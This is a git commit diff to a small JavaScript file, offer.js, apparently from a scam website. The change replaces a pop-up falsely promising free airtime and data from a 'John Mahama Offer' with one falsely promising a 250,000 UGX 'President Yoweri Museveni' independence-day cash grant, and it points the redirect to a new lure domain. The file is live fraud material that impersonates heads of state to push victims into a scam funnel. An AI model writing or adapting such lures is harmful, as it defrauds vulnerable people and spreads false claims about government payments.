0e63de0289ecdb061594a91a708fce8528e30e07
codexken <inyeneawakessien@gmail.com>
2024-10-08 22:28:38 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'WITHDRAW 250,000UGX'
+password=prompt('SMS: Congratulations You are qualify for PRESIDENT YOWERI MUSEVENI 250,000UGX INDEPENDENCE DAY CASH GRANT FOR UGANDANS, Kindly Press OK to Withdraw Cash Prize  ','WITHDRAW 250,000UGX');
+if (password != 'WITHDRAW 250,000UGX') {
+location.href='https://ug-independence.programs.lat/offer';
 }
